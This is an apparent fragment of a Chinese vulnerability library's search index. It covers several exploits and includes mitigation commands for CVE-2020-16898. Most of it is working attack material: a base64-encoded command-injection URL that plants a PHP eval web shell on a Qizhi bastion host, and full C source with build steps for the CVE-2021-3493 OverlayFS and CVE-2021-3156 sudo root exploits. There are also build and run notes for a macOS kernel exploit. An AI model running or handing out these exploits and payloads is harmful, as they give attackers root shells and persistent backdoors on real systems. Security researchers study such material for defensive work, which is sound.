@$_POST['mac'];\n\nif (!$userip  !$usermac) {\n    exit;\n}\n \u5224\u65ad\u8be5\u7528\u6237\u662f\u5426\u5df2\u7ecf\u653e\u884c \n \u9a8c\u8bc1IP\u53c2\u6570\u662f\u5426\u5408\u6cd5\u3002\u4ee5\u4fee\u590d\u6f0f\u6d1e\nif(filter_var($userip, FILTER_VALIDATE_IP)){\n    $cmd = 'sbinapp_auth_hook.elf -f ' . $userip;\n    $res = exec($cmd, $out, $status);\n     \u5982\u679c\u5df2\u7ecf\u4e0a\u7ebf\u6210\u529f \n    if (strstr($out[0], status1)) {\n        echo 'true';\n    }\n}else {\n    echo hacker fuck u;\n}\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"\u9f50\u6cbb\u5821\u5792\u673a\u524d\u53f0\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e-0day","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>ShtermClient-2.1.1</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>1.\u8bbf\u95ee http://10.20.10.11/listener/cluster_manage.php \u8fd4\u56deOK 2.\u8bbf\u95ee\u5982\u4e0b\u94fe\u63a5\u751f\u6210\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <pre><code>https://10.20.10.10/ha_request.php?action=install&amp;ipaddr=10.20.10.11&amp;node_id=1${IFS}|`echo${IFS}\"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUW3NoZWxsXSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9zaGVsbC5waHA=\"|base64${IFS}-d|bash`|${IFS}|echo${IFS} \n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Linux/Linux%20kernel%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2021-3493/","title":"Linux kernel\u6743\u9650\u63d0\u5347\u6f0f\u6d1e CVE-2021-3493","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Linux/Linux%20kernel%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2021-3493/#_1","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>Ubuntu OverlayFS Local Privesc</p> <p>CVE-2021-3493 EXP\u5728Github\u88ab\u516c\u5f00\uff0c\u53ef\u4ee5\u901a\u8fc7EXP\u5728Ubuntu\u591a\u4e2a\u5f71\u54cd\u7cfb\u7edf\u4e2d\u63d0\u5347 ROOT\u6743\u9650</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Linux/Linux%20kernel%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2021-3493/#_2","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<ul> <li>Ubuntu 20.10</li> <li>Ubuntu 20.04 LTS</li> <li>Ubuntu 18.04 LTS</li> <li>Ubuntu 16.04 LTS</li> <li>Ubuntu 14.04 ESM</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Linux/Linux%20kernel%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2021-3493/#_3","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u6f0f\u6d1eGithub\u5730\u5740\u4e3a\uff1a</p> <p>https://github.com/briskets/CVE-2021-3493</p> <pre><code>gcc exploit.c -o exploit\nchmod +x exploit\n./exploit\n</code></pre> <p>\u6267\u884c\u540e\u63d0\u6743\u81f3 ROOT</p> <p>exp.c</p> <pre><code>#define _GNU_SOURCE\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;err.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;sched.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;sys/mount.h&gt;\n\n//#include &lt;attr/xattr.h&gt;\n//#include &lt;sys/xattr.h&gt;\nint setxattr(const char *path, const char *name, const void *value, size_t size, int flags);\n\n\n#define DIR_BASE    \"./ovlcap\"\n#define DIR_WORK    DIR_BASE \"/work\"\n#define DIR_LOWER   DIR_BASE \"/lower\"\n#define DIR_UPPER   DIR_BASE \"/upper\"\n#define DIR_MERGE   DIR_BASE \"/merge\"\n#define BIN_MERGE   DIR_MERGE \"/magic\"\n#define BIN_UPPER   DIR_UPPER \"/magic\"\n\n\nstatic void xmkdir(const char *path, mode_t mode)\n{\n    if (mkdir(path, mode) == -1 &amp;&amp; errno != EEXIST)\n        err(1, \"mkdir %s\", path);\n}\n\nstatic void xwritefile(const char *path, const char *data)\n{\n    int fd = open(path, O_WRONLY);\n    if (fd == -1)\n        err(1, \"open %s\", path);\n    ssize_t len = (ssize_t) strlen(data);\n    if (write(fd, data, len) != len)\n        err(1, \"write %s\", path);\n    close(fd);\n}\n\nstatic void xcopyfile(const char *src, const char *dst, mode_t mode)\n{\n    int fi, fo;\n\n    if ((fi = open(src, O_RDONLY)) == -1)\n        err(1, \"open %s\", src);\n    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)\n        err(1, \"open %s\", dst);\n\n    char buf[4096];\n    ssize_t rd, wr;\n\n    for (;;) {\n        rd = read(fi, buf, sizeof(buf));\n        if (rd == 0) {\n            break;\n        } else if (rd == -1) {\n            if (errno == EINTR)\n                continue;\n            err(1, \"read %s\", src);\n        }\n\n        char *p = buf;\n        while (rd &gt; 0) {\n            wr = write(fo, p, rd);\n            if (wr == -1) {\n                if (errno == EINTR)\n                    continue;\n                err(1, \"write %s\", dst);\n            }\n            p += wr;\n            rd -= wr;\n        }\n    }\n\n    close(fi);\n    close(fo);\n}\n\nstatic int exploit()\n{\n    char buf[4096];\n\n    sprintf(buf, \"rm -rf '%s/'\", DIR_BASE);\n    system(buf);\n\n    xmkdir(DIR_BASE, 0777);\n    xmkdir(DIR_WORK,  0777);\n    xmkdir(DIR_LOWER, 0777);\n    xmkdir(DIR_UPPER, 0777);\n    xmkdir(DIR_MERGE, 0777);\n\n    uid_t uid = getuid();\n    gid_t gid = getgid();\n\n    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)\n        err(1, \"unshare\");\n\n    xwritefile(\"/proc/self/setgroups\", \"deny\");\n\n    sprintf(buf, \"0 %d 1\", uid);\n    xwritefile(\"/proc/self/uid_map\", buf);\n\n    sprintf(buf, \"0 %d 1\", gid);\n    xwritefile(\"/proc/self/gid_map\", buf);\n\n    sprintf(buf, \"lowerdir=%s,upperdir=%s,workdir=%s\", DIR_LOWER, DIR_UPPER, DIR_WORK);\n    if (mount(\"overlay\", DIR_MERGE, \"overlay\", 0, buf) == -1)\n        err(1, \"mount %s\", DIR_MERGE);\n\n    // all+ep\n    char cap[] = \"\\x01\\x00\\x00\\x02\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\";\n\n    xcopyfile(\"/proc/self/exe\", BIN_MERGE, 0777);\n    if (setxattr(BIN_MERGE, \"security.capability\", cap, sizeof(cap) - 1, 0) == -1)\n        err(1, \"setxattr %s\", BIN_MERGE);\n\n    return 0;\n}\n\nint main(int argc, char *argv[])\n{\n    if (strstr(argv[0], \"magic\") || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], \"shell\"))) {\n        setuid(0);\n        setgid(0);\n        execl(\"/bin/bash\", \"/bin/bash\", \"--norc\", \"--noprofile\", \"-i\", NULL);\n        err(1, \"execl /bin/bash\");\n    }\n\n    pid_t child = fork();\n    if (child == -1)\n        err(1, \"fork\");\n\n    if (child == 0) {\n        _exit(exploit());\n    } else {\n        waitpid(child, NULL, 0);\n    }\n\n    execl(BIN_UPPER, BIN_UPPER, \"shell\", NULL);\n    err(1, \"execl %s\", BIN_UPPER);\n}\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Linux/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2021-3156/","title":"Linux sudo\u6743\u9650\u63d0\u5347\u6f0f\u6d1e CVE-2021-3156","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Linux/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2021-3156/#_1","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>2021\u5e741\u670826\u65e5\uff0cLinux\u5b89\u5168\u5de5\u5177sudo\u88ab\u53d1\u73b0\u4e25\u91cd\u7684\u57fa\u4e8e\u5806\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u3002\u5229\u7528\u8fd9\u4e00\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u65e0\u9700\u77e5\u9053\u7528\u6237\u5bc6\u7801\uff0c\u4e00\u6837\u53ef\u4ee5\u83b7\u5f97root\u6743\u9650\uff0c\u5e76\u4e14\u662f\u5728\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u3002\u6b64\u6f0f\u6d1e\u5df2\u5206\u914d\u4e3aCVE-2021-3156\uff0c\u5371\u9669\u7b49\u7ea7\u8bc4\u5206\u4e3a7\u5206\u3002</p> <p>\u5f53sudo\u901a\u8fc7-s\u6216-i\u547d\u4ee4\u884c\u9009\u9879\u5728shell\u6a21\u5f0f\u4e0b\u8fd0\u884c\u547d\u4ee4\u65f6\uff0c\u5b83\u5c06\u5728\u547d\u4ee4\u53c2\u6570\u4e2d\u4f7f\u7528\u53cd\u659c\u6760\u8f6c\u4e49\u7279\u6b8a\u5b57\u7b26\u3002\u4f46\u4f7f\u7528-s\u6216-i\u6807\u5fd7\u8fd0\u884csudoedit\u65f6\uff0c\u5b9e\u9645\u4e0a\u5e76\u672a\u8fdb\u884c\u8f6c\u4e49\uff0c\u4ece\u800c\u53ef\u80fd\u5bfc\u81f4\u7f13\u51b2\u533a\u6ea2\u51fa\u3002\u56e0\u6b64\u53ea\u8981\u5b58\u5728sudoers\u6587\u4ef6\uff08\u901a\u5e38\u662f/etc/sudoers\uff09\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u4f7f\u7528\u672c\u5730\u666e\u901a\u7528\u6237\u5229\u7528sudo\u83b7\u5f97\u7cfb\u7edfroot\u6743\u9650\u3002\u7814\u7a76\u4eba\u5458\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u591a\u4e2aLinux\u53d1\u884c\u7248\u4e0a\u6210\u529f\u83b7\u5f97\u4e86\u5b8c\u6574\u7684root\u6743\u9650\uff0c\u5305\u62ecUbuntu 20.04\uff08sudo 1.8.31\uff09\u3001Debian 10\uff08sudo 1.8.27\uff09\u548cFedora 33\uff08sudo 1.9.2\uff09\uff0c\u5e76\u4e14sudo\u652f\u6301\u7684\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\u548cLinux\u53d1\u884c\u7248\u4e5f\u5f88\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Linux/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2021-3156/#_2","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>Sudo 1.8.2 - 1.8.31p2</p> <p>Sudo 1.9.0 - 1.9.5p1</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Linux/Linux%20sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2021-3156/#poc","title":"\u6f0f\u6d1e\u5229\u7528POC","text":"<p>[!NOTE]</p> <p>POC\u76ee\u5f55\u5df2\u7ecf\u52a0\u5165\u6f0f\u6d1e\u5229\u7528\u4ee3\u7801</p> <p>\u53e6\u4e00\u4e2a\u65e0\u4ea4\u4e92\u5f0fshell\u4f7f\u7528\u7684\u811a\u672c https://github.com/Rvn0xsy/CVE-2021-3156-plus</p> <p>Makefile</p> <pre><code>all:\n    rm -rf libnss_X\n    mkdir libnss_X\n    gcc -o sudo-hax-me-a-sandwich hax.c\n    gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c\nclean:\n    rm -rf libnss_X sudo-hax-me-a-sandwich\n</code></pre> <p>hax.c</p> <pre><code>/**\n ** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;\n ** ===========================================\n **\n ** Exploit for that sudo heap overflow thing everyone is talking about.\n ** This one aims for singleshot. Does not fuck with your system files.\n ** No warranties.\n **\n ** Shout outs to:\n **   Qualys      - for pumping out the awesome bugs\n **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)\n **   dsc         - for letting me rack up his electricity bill\n **   my wife     - for all the quality time we had to skip\n **\n **  Enjoy!\n **\n **   -- blasty // 20210130\n **/\n\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;ctype.h&gt;\n\n// 512 environment variables should be enough for everyone\n#define MAX_ENVP 512\n\ntypedef struct {\n    char *target_name;\n    char *sudoedit_path;\n    uint32_t smash_len_a;\n    uint32_t smash_len_b;\n    uint32_t null_stomp_len;\n    uint32_t lc_all_len; \n} target_t;\n\ntarget_t targets[] = {\n    {\n        .target_name    = \"Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31\",\n        .sudoedit_path  = \"/usr/bin/sudoedit\",\n        .smash_len_a    = 56,\n        .smash_len_b    = 54,\n        .null_stomp_len = 63, \n        .lc_all_len     = 212\n    },\n    {\n        .target_name    = \"Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28\",\n        .sudoedit_path  = \"/usr/bin/sudoedit\",\n        .smash_len_a    = 64,\n        .smash_len_b    = 49,\n        .null_stomp_len = 60, \n        .lc_all_len     = 214\n    }\n};\n\nvoid usage(char *prog) {\n    printf(\"  usage: %s &lt;target&gt;\\n\\n\", prog);\n    printf(\"  available targets:\\n\");\n    printf(\"  ------------------------------------------------------------\\n\");\n    for(int i = 0; i &lt; sizeof(targets) / sizeof(target_t); i++) {\n        printf(\"    %d) %s\\n\", i, targets[i].target_name);\n    }\n    printf(\"  ------------------------------------------------------------\\n\");\n    printf(\"\\n\");\n}\n\nint main(int argc, char *argv[]) {\n    printf(\"\\n** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;\\n\\n\");\n\n    if (argc != 2) {\n        usage(argv[0]);\n        return -1;\n    }\n\n    target_t *target = &amp;targets[ atoi(argv[1]) ];\n\n    printf(\"using target: '%s'\\n\", target-&gt;target_name);\n\n    char *smash_a = calloc(target-&gt;smash_len_a + 2, 1);\n    char *smash_b = calloc(target-&gt;smash_len_b + 2, 1);\n\n    memset(smash_a, 'A', target-&gt;smash_len_a);\n    memset(smash_b, 'B', target-&gt;smash_len_b);\n\n    smash_a[target-&gt;smash_len_a] = '\\\\';\n    smash_b[target-&gt;smash_len_b] = '\\\\';\n\n    char *s_argv[]={\n        \"sudoedit\", \"-s\", smash_a, \"\\\\\", smash_b, NULL\n    };\n\n    char *s_envp[MAX_ENVP];\n    int envp_pos = 0;\n\n    for(int i = 0; i &lt; target-&gt;null_stomp_len; i++) {\n        s_envp[envp_pos++] = \"\\\\\";\n    }\n    s_envp[envp_pos++] = \"X/P0P_SH3LLZ_\";\n\n    char *lc_all = calloc(target-&gt;lc_all_len + 16, 1);\n    strcpy(lc_all, \"LC_ALL=C.UTF-8@\");\n    memset(lc_all+15, 'C', target-&gt;lc_all_len);\n\n    s_envp[envp_pos++] = lc_all;\n    s_envp[envp_pos++] = NULL;\n\n    printf(\"** pray for your rootshell.. **\\n\");\n\n    execve(target-&gt;sudoedit_path, s_argv, s_envp);\n    return 0;\n}\n</code></pre> <p>lib.c</p> <pre><code>#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nstatic void __attribute__ ((constructor)) _init(void);\n\nstatic void _init(void) {\n    printf(\"[+] bl1ng bl1ng! We got it!\\n\");\n    setuid(0); seteuid(0); setgid(0); setegid(0);\n    static char *a_argv[] = { \"sh\", NULL };\n    static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL };\n    execv(\"/bin/sh\", a_argv);\n}\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/MacOS/macOS-Kernel-Exploit/","title":"macOS-Kernel-Exploit","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/MacOS/macOS-Kernel-Exploit/#disclaimer","title":"DISCLAIMER","text":"<p>You need to know the KASLR slide to use the exploit. Also SMAP needs to be disabled which means that it's not exploitable on Macs after 2015. These limitations make the exploit pretty much unusable for in-the-wild exploitation but still helpful for security researchers in a controlled lab environment.</p> <p>This exploit is intended for security research purposes only.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/MacOS/macOS-Kernel-Exploit/#general","title":"General","text":"<p>macOS Kernel Exploit for CVE-????-???? (currently a 0day.  I'll add the CVE# once it is published ;) ). </p> <p>Thanks to @LinusHenze for this cool bug and his support ;P.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/MacOS/macOS-Kernel-Exploit/#writeup","title":"Writeup","text":"<p>Probably coming soon. If you want to try and exploit it yourself, here are a few things to get you started:</p> <ul> <li>VM: Download the macOS installer from the appstore and drag the <code>.app</code> file into VMWare's <code>NEW VM</code> window</li> <li>Kernel Debugging setup: http://ddeville.me/2015/08/using-the-vmware-fusion-gdb-stub-for-kernel-debugging-with-lldb</li> <li>Have a look at the _kernel_trap function</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/MacOS/macOS-Kernel-Exploit/#build","title":"Build","text":"<p>I recommend setting the bootargs to: <code>debug=0x44 kcsuffix=development -v</code></p> <p> Note: SMAP needs to be disabled on macs after 2015 (<code>-pmap_smap_disable</code>)</p> <p>You will need XCODE &lt;= 9.4.1 to build the exploit. (It needs to be 32bit) Downloading Xcode 9.4.1 Commandline Tools should be enough ;) Download: https://developer.apple.com/download/more/</p> <pre><code>make\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/MacOS/macOS-Kernel-Exploit/#execution","title":"Execution","text":"<pre><code>./exploit &lt;KASLR slide&gt;\n</code></pre> <p>Tested on macOS Mojave: <code>Darwin Kernel-Mac.local 18.7.0 Darwin Kernel Version 18.7.0: Thu Jun 20 18:42:21 PDT 2019; root:xnu-4903.270.47~4/DEVELOPMENT_X86_64 x86_64</code></p> <p>Demo:</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2020-16898%20Bad%20Neighbor%20%20Windows%20TCPIP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"CVE 2020 16898 Bad Neighbor  Windows TCPIP\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2020-16898%20Bad%20Neighbor%20%20Windows%20TCPIP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#cve-2020-16898-bad-neighbor-windows-tcpip","title":"CVE-2020-16898 \"Bad Neighbor \" Windows TCP/IP\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790","text":"<p>\u8be5\u6f0f\u6d1e\u4e3b\u8981\u662f\u7531\u4e8eWindows  TCP/IP\u5806\u6808\u5728\u5904\u7406\u9009\u9879\u7c7b\u578b\u4e3a25(0x19\uff0c\u9012\u5f52DNS\u670d\u52a1\u5668\u9009\u9879)\u4e14\u957f\u5ea6\u5b57\u6bb5\u503c\u4e3a\u5076\u6570\u7684ICMPv6\u7684\u8def\u7531\u5e7f\u64ad\u6570\u636e\u5305\u65f6\uff0c\u5904\u7406\u903b\u8f91\u5b58\u5728\u7eb0\u6f0f\uff0c\u5bfc\u81f4\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u6210\u529f\u5229\u7528\u8be5\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u76ee\u6807\u673a\u5668\uff08\u4e3b\u673a\u6216\u670d\u52a1\u5668\uff09\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> <p>\u4e00\u3001\u6f0f\u6d1e\u4fe1\u606f</p> <p>1. \u6f0f\u6d1e\u7b80\u8ff0</p> <ul> <li>\u6f0f\u6d1e\u540d\u79f0\uff1aWindows TCP/IP Remote Code Execution Vulnerability</li> <li>\u6f0f\u6d1e\u7f16\u53f7\uff1aCVE-2020-16898</li> <li>\u6f0f\u6d1e\u7c7b\u578b\uff1aDesign Weakness</li> <li>\u6f0f\u6d1e\u5f71\u54cd\uff1aCode Execution</li> <li>CVSS\u8bc4\u5206\uff1a9.8</li> <li>\u5229\u7528\u96be\u5ea6\uff1aMedium</li> <li>\u57fa\u7840\u6743\u9650\uff1a\u4e0d\u9700\u8981</li> </ul> <p>2. \u7ec4\u4ef6\u6982\u8ff0</p> <p>TCP/IP\u662fInternet\u4e0a\u4f7f\u7528\u7684\u901a\u4fe1\u534f\u8bae\u3002   \u5728Windows\u7684\u65e9\u671f\u7248\u672c\u4e2d\uff0cTCP/IP\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u53ef\u9009\u7ec4\u4ef6\uff0c\u53ef\u4ee5\u50cf\u5176\u4ed6\u4efb\u4f55\u534f\u8bae\u4e00\u6837\u5220\u9664\u6216\u6dfb\u52a0\u3002\u4eceWindows XP/Server   2003\u5f00\u59cb\uff0cTCP/IP\u6210\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7684\u6838\u5fc3\u7ec4\u4ef6\uff0c\u65e0\u6cd5\u5220\u9664\u3002  \u5c06TCP/IP\u4f5c\u4e3aWindows\u7684\u6838\u5fc3\u7ec4\u4ef6\u662f\u975e\u5e38\u6709\u610f\u4e49\u7684\uff0c\u56e0\u4e3a\u5b83\u7684\u529f\u80fd\u5728Microsoft  Windows  Server\u4e0a\u5bf9\u7f51\u7edc\u64cd\u4f5c\u548cActive Directory\u57df\u73af\u5883\u5c24\u4e3a\u91cd\u8981\u3002 \u6574\u4e2aActive   Directory\u67b6\u6784\u57fa\u4e8eDNS\u5c42\u6b21\u7ed3\u6784\uff0c\u4f9d\u8d56\u4e8eTCP/IP \u4f20\u8f93\u534f\u8bae \u3002</p> <p>Microsoft  Windows\u4e2d\u7684TCP/IP\u529f\u80fd\u5728\u5185\u6838\u7ea7\u522b\u8fd0\u884c\uff0c\u5e76\u7531\u9a71\u52a8\u7a0b\u5e8ftcpip.sys\u63d0\u4f9b\u3002\u8be5\u9a71\u52a8\u7a0b\u5e8f\u5904\u7406\u6240\u6709\u4f20\u5165\u548c\u4f20\u51fa\u7684TCP/IP\u901a\u4fe1\u4fe1\u606f\uff0c\u5305\u62ec\u89e3\u6790\u4ece\u7f51\u7edc\u63a5\u53e3\u63a5\u6536\u5230\u7684\u6570\u636e\u5305\uff0c\u4ee5\u53ca\u89e3\u91ca\u6b64\u6570\u636e\u5e76\u5c06\u5176\u4f20\u9012\u7ed9\u66f4\u9ad8\u7ea7\u522b\u7684\u7ec4\u4ef6\u3002</p> <p>3. \u6f0f\u6d1e\u5229\u7528</p> <p>\u8be5\u6f0f\u6d1e\u4e3b\u8981\u662f\u7531\u4e8eWindows   TCP/IP\u5806\u6808\u5728\u5904\u7406\u9009\u9879\u7c7b\u578b\u4e3a25(0x19\uff0c\u9012\u5f52DNS\u670d\u52a1\u5668\u9009\u9879)\u4e14\u957f\u5ea6\u5b57\u6bb5\u503c\u4e3a\u5076\u6570\u7684ICMPv6\u7684\u8def\u7531\u5e7f\u64ad\u6570\u636e\u5305\u65f6\uff0c\u5904\u7406\u903b\u8f91\u5b58\u5728\u7eb0\u6f0f\uff0c\u5bfc\u81f4\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u6210\u529f\u5229\u7528\u8be5\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u76ee\u6807\u673a\u5668(\u4e3b\u673a\u6216\u670d\u52a1\u5668)\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> <p>4. \u6f0f\u6d1e\u5f71\u54cd</p> <ul> <li>Microsoft Windows 10 1709</li> <li>Microsoft Windows 10 1803</li> <li>Microsoft Windows 10 1809</li> <li>Microsoft Windows 10 1903</li> <li>Microsoft Windows 10 1909</li> <li>Microsoft Windows 10 2004</li> <li>Microsoft Windows Server 2019</li> <li>Microsoft Windows Server, version 1903</li> <li>Microsoft Windows Server, version 1909</li> <li>Microsoft Windows Server, version 2004</li> </ul> <p>5. \u89e3\u51b3\u65b9\u6848</p> <p>\u5b98\u65b9\u89e3\u51b3\u65b9\u6848\uff1a\u5fae\u8f6f\u5b98\u65b9\u9488\u5bf9\u8be5\u6f0f\u6d1e\u5df2\u53d1\u5e03\u5b89\u5168\u66f4\u65b0\u8865\u4e01\uff0c\u8865\u4e01\u5730\u5740\uff1ahttps://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898</p> <p>\u4e34\u65f6\u89e3\u51b3\u65b9\u6848\uff1a</p> <p>\u7ba1\u7406\u5458\u542f\u52a8powershell\u6216cmd\uff0c\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4\u68c0\u67e5\u6240\u6709\u7f51\u7edcIPv6\u63a5\u53e3\u7684\u5217\u8868\u4ee5\u53ca\u76f8\u5e94\u7684\u7d22\u5f15\u53f7\uff1a</p> <p>netsh int ipv6 sh int</p> <p>\u6837\u4f8b\u8f93\u51fa\u5982\u4e0b\uff1a</p> <p></p> <p>\u786e\u8ba4\u7f51\u7edc\u63a5\u53e3\u7684RDNSS\u529f\u80fd\u5f00\u542f\u60c5\u51b5\uff1a</p> <p>netsh int ipv6 sh int Idx number</p> <p></p> <p>\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u5173\u95edRDNSS\u529f\u80fd(\u5c06Idx number\u66ff\u6362\u4e3a\u8981\u5173\u95ed\u7684\u7f51\u7edc\u63a5\u53e3\u7684Idx\u503c)\uff1a</p> <p>netsh int ipv6 set int Idx number rabaseddnsconfig=disable</p> 